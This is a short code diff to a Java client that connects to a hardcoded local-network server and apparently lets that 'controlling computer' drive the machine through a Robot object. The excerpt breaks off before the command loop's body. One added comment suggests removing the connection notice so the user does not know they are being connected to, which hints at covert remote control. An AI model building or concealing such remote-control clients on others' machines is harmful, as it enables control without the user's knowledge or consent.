@@ -11,13 +11,15 @@ public class Client {
 	public static void main(String args[]){
 		
 		try {
-			
+			//comment this out if you dont want the user to know your connecting to them
 			JOptionPane.showMessageDialog(null, "CONNECTING TO SERVER");
 			
+			//initializing connection to server (controlling computer)
 			Socket socket = new Socket("192.168.0.19", 6675);
 			
 			Scanner listener = new Scanner(socket.getInputStream());
 			
+			//initializing Robot Object
 			Robot robot = new Robot();
 			
 			while(!listener.nextLine().equals("end")) {
